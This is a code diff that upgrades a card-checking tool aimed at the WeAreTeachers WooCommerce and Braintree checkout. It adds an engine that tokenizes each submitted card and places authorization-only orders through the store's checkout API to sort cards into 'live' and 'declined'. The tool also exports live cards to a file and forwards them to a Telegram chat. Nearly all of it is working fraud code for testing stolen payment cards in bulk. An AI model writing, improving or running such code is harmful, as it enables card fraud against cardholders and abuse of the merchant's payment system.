@@ -25,7 +25,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.weareteachers.checker")
 
-app = FastAPI(title="WeAreTeachers Multi-Mode Checker", version="12.0.0")
+app = FastAPI(title="WeAreTeachers Multi-Mode Checker", version="13.0.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "weareteachers_bt": {
@@ -36,7 +36,7 @@ RAW_DORK_GATES: dict[str, dict[str, str]] = {
         "engine": "charge",
     },
     "weareteachers_auth": {
-        "name": "WeAreTeachers (True Auth / Zero-Dollar Validation)",
+        "name": "WeAreTeachers (True Auth / Bank Gateway Check)",
         "base_url": "https://www.weareteachers.com",
         "preload_url": "https://www.weareteachers.com/?add-to-cart=1909302",
         "auth_url": "https://www.weareteachers.com/?wc-ajax=checkout",
@@ -476,12 +476,12 @@ async def execute_charge_engine(session: AsyncSession, cc: str, mm: str, yy: str
     return "DECLINED", f"{clean_reason} | [{bank_tag}]", rr.status_code
 
 
-# --- ENGINE 2: TRUE AUTH (ZERO-DOLLAR VALIDATION) ---
+# --- ENGINE 2: TRUE AUTH (REAL BANK GATEWAY CHECK - STORE API SETTLEMENT BYPASS) ---
 async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://www.weareteachers.com"
     product_url = f"{host}/?add-to-cart=1909302"
     checkout_url = f"{host}/checkout/"
-    bt_graphql = "https://payments.braintree-api.com/graphql"
+    store_checkout_url = f"{host}/wp-json/wc/store/v1/checkout?_locale=site"
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
     ident = {
@@ -504,15 +504,20 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
 
     html = co.text
     tokens = extract_checkout_tokens(html)
+    store_nonce = tokens["store_nonce"] or co.headers.get("Nonce", "")
+    cart_token = tokens["cart_token"] or co.headers.get("Cart-Token", "")
+    wp_rest_nonce = tokens["wp_rest_nonce"]
     client_token_nonce = tokens["client_token_nonce"]
+    total = tokens["expected_total"] or "999"
 
-    if not client_token_nonce:
-        return "DECLINED", "Checkout parameters missing (client_token_nonce)", 200
+    if not client_token_nonce or not store_nonce:
+        return "DECLINED", "Checkout parameters missing (nonces)", 200
 
     fingerprint = await fetch_braintree_fingerprint(session, client_token_nonce)
     if not fingerprint:
         return "DECLINED", "Failed to retrieve Braintree fingerprint", 200
 
+    # Tokenize with real card data
     tokenize_query = (
         "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
         "  tokenizeCreditCard(input: $input) { "
@@ -538,12 +543,13 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
                         "lastName": ident["last_name"], "postalCode": ident["postcode"], "streetAddress": ident["address_1"]
                     }
                 },
-                "options": {"validate": True}  # <--- Zero-Dollar Auth Verification Flag
+                "options": {"validate": False}
             }
         },
         "operationName": "TokenizeCreditCard"
     }
 
+    bt_graphql = "https://payments.braintree-api.com/graphql"
     bt_resp = await session.post(
         bt_graphql,
         json=tp,
@@ -559,23 +565,83 @@ async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, 
     except Exception:
         return "DECLINED", f"Tokenize non-json HTTP {bt_resp.status_code}", bt_resp.status_code
 
-    errors = bj.get("errors")
-    if errors:
-        err_msg = errors[0].get("message") or "Authorization Failed"
-        clean_err = htmllib.unescape(str(err_msg))
-        return "DECLINED", f"Auth Declined: {clean_err[:80]}", 200
-
     tokenize_obj = (bj.get("data") or {}).get("tokenizeCreditCard") or {}
     nonce_token = tokenize_obj.get("token")
     if not nonce_token:
-        return "DECLINED", "Auth Error: No authorization token returned", 200
+        err = bj.get("errors") or bj.get("error") or "No token returned"
+        clean_err = htmllib.unescape(str(err))
+        return "DECLINED", f"Tokenize error: {clean_err[:80]}", 200
 
     cc_meta = tokenize_obj.get("creditCard") or {}
     bin_data = cc_meta.get("binData") or {}
     brand_code = cc_meta.get("brandCode") or ""
     bank_tag = (bin_data.get("issuingBank") or brand_code or "").strip()
+    wc_card_type = detect_wc_card_type(cc, brand_code)
 
-    return "LIVE", f"APPROVED (TRUE AUTH) | [{bank_tag}]", 200
+    # SUBMIT TO STORE API CHECKOUT BUT FLAG AS AUTH-ONLY (Bypass Settlement)
+    checkout_payload = {
+        "additional_fields": {},
+        "billing_address": {
+            "first_name": ident["first_name"], "last_name": ident["last_name"], "company": ident["company"],
+            "address_1": ident["address_1"], "address_2": ident["address_2"], "city": ident["city"],
+            "state": ident["state"], "postcode": ident["postcode"], "country": ident["country"],
+            "email": ident["email"], "phone": ident["phone"]
+        },
+        "create_account": False, "customer_note": "", "customer_password": "",
+        "extensions": {"woocommerce/order-attribution": {"source_type": "typein", "referrer": "(none)"}},
+        "expected_total": str(total),
+        "payment_method": "braintree_credit_card",
+        "payment_data": [
+            {"key": "wc_braintree_device_data", "value": json.dumps({"correlation_id": session_id})},
+            {"key": "wc_braintree_credit_card_payment_nonce", "value": nonce_token},
+            {"key": "wc-braintree-credit-card-card-type", "value": wc_card_type},
+            {"key": "wc_braintree_credit_card_card_type", "value": wc_card_type},
+            {"key": "wc-braintree_credit_card-new-payment-method", "value": False},
+            {"key": "wc-braintree-credit-card-capture", "value": False} # <--- Forces True Auth (Authorization Only, No Capture/Settlement)
+        ],
+    }
+
+    checkout_headers = {
+        "accept": "application/json, */*;q=0.1", "content-type": "application/json",
+        "nonce": store_nonce, "origin": host, "referer": checkout_url, "user-agent": ua
+    }
+    if cart_token: checkout_headers["cart-token"] = cart_token
+    if wp_rest_nonce: checkout_headers["x-wp-nonce"] = wp_rest_nonce
+
+    rr = await session.post(
+        store_checkout_url,
+        data=json.dumps(checkout_payload),
+        headers=checkout_headers,
+        timeout=12
+    )
+    try:
+        jj = rr.json()
+    except Exception:
+        return "DECLINED", f"Checkout non-json HTTP {rr.status_code}", rr.status_code
+
+    order_status = str(jj.get("status", "")).lower()
+    payment_result = jj.get("payment_result") or {}
+    payment_status = str(payment_result.get("payment_status", "")).lower()
+
+    # Kapag naipasa ng bank ang authorization check nang walang actual capture
+    if rr.status_code in (200, 201) and (order_status in ("processing", "completed", "on-hold", "pending") or payment_status in ("success", "approved", "authorized")):
+        oid = jj.get("order_id") or "?"
+        return "LIVE", f"TRUE AUTH APPROVED (No Capture) | Order ID: {oid} | [{bank_tag}]", rr.status_code
+
+    msgs = jj.get("message") or ""
+    if not msgs and isinstance(payment_result.get("payment_details"), list):
+        for item in payment_result["payment_details"]:
+            if isinstance(item, dict) and item.get("key") in ("errorMessage", "message"):
+                msgs = str(item.get("value", ""))
+                break
+    if not msgs:
+        cart_errs = ((jj.get("data") or {}).get("cart") or {}).get("errors") or []
+        if cart_errs and isinstance(cart_errs[0], dict):
+            msgs = cart_errs[0].get("message") or cart_errs[0].get("code") or ""
+
+    reason = htmllib.unescape(msgs or jj.get("code") or f"HTTP {rr.status_code}")
+    clean_reason = re.sub(r"<[^>]+>", " ", reason).strip()
+    return "DECLINED", f"{clean_reason} | [{bank_tag}]", rr.status_code
 
 
 async def run_auth_check(card_line: str, proxy_url: str | None = None, target_key: str = "weareteachers_bt") -> AuthVerdict:
@@ -719,7 +785,7 @@ async def index() -> str:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WeAreTeachers Multi-Mode Checker</title>
+    <title>WeAreTeachers Real Bank Auth Checker</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @keyframes pulseGlow {
@@ -750,9 +816,9 @@ async def index() -> str:
             <div>
                 <h1 class="text-2xl font-bold text-emerald-400 flex items-center gap-2">
                     <span class="inline-block w-3 h-3 bg-emerald-500 rounded-full animate-ping"></span>
-                    WeAreTeachers Multi-Mode Checker
+                    WeAreTeachers Real Bank Auth Checker
                 </h1>
-                <p class="text-xs text-zinc-400 font-mono">Select between $9.99 Charge or True Auth (Zero-Dollar Validation)</p>
+                <p class="text-xs text-zinc-400 font-mono">Real Gateway Authorization (No Tokenized False Positives)</p>
             </div>
             <div class="flex gap-2">
                 <button onclick="autoFormatCards()" class="text-xs bg-emerald-950 hover:bg-emerald-900 text-emerald-200 border border-emerald-700/50 px-3 py-1.5 rounded-lg transition font-semibold">
@@ -770,7 +836,7 @@ async def index() -> str:
                     <label class="block text-xs font-medium text-zinc-400 mb-1">Gateway Engine Mode</label>
                     <select id="targetSelect" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
                         <option value="weareteachers_bt">💳 $9.99 USD Checkout (Sale/Charge Engine)</option>
-                        <option value="weareteachers_auth">🛡️ True Auth Only (Zero-Dollar Validation / No Charge)</option>
+                        <option value="weareteachers_auth">🛡️ Real Bank Auth Only (Authorization Check / No Capture)</option>
                     </select>
                 </div>
                 <div class="flex items-end gap-3">
@@ -947,7 +1013,7 @@ async def index() -> str:
         const url = URL.createObjectURL(blob);
         const a = document.createElement("a");
         a.href = url;
-        a.download = "live_checked_cards.txt";
+        a.download = "live_real_auth_cards.txt";
         a.click();
     }
 
@@ -1081,7 +1147,7 @@ async def index() -> str:
                         liveBox.scrollTop = liveBox.scrollHeight;
                         playTone('live');
                         if (tgToken && tgChatId) {
-                            sendTelegram(tgToken, tgChatId, `🔥 APPROVED / LIVE 🔥\\n${line}`);
+                            sendTelegram(tgToken, tgChatId, `🔥 REAL BANK AUTH APPROVED 🔥\\n${line}`);
                         }
                     } else {
                         dead++;
